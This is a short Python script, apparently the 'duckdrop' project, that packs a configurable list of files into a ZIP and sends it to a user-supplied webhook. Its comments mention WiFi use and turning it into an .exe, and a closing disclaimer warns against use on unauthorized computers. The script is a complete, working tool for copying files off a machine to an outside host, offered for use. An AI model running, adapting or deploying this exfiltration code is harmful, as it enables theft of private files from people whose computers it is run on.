import requests
import os
import zipfile
import tempfile
# duckdrop DOES require WiFi (if ya didnt know.)
WEBHOOK = "" # <--- Place your webhook URL between the two quotes.

FILES = [
    "examples/file1.png", # customize these files, doesnt have to be image files. IT could be anything, multiple folders ARE supported.
    "examples/file2.jpg" # feel free to addon, just keep making a comma after all of them execpt for the last one. or keep one file and make no comma.
]

def send_as_zip():
    with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
        zip_path = tmp.name

    try:
        with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as zipf:
            for file_path in FILES:
                if os.path.exists(file_path):
                    zipf.write(file_path, arcname=os.path.basename(file_path))

        with open(zip_path, "rb") as f:
            files = {
                "file": ("package.zip", f, "application/zip") # Sends you're files in a ZIP file, it makes it easier to send if you have multiple files set.
            }
            requests.post(WEBHOOK, files=files, timeout=30)

    finally:
        if os.path.exists(zip_path):
            os.remove(zip_path)

if __name__ == "__main__":
    send_as_zip()

# Report any issues, or suggestions in the Github Issues Page.
# Educational Purposes Only! Don't use this on unauthorized Personal Computers.
# Duckdrop © 2026 // github.com/API-Kitty/duckdrop
# IMPORTANT: Inside the duckdrop Folder, open creator.txt for .exe creation tips.
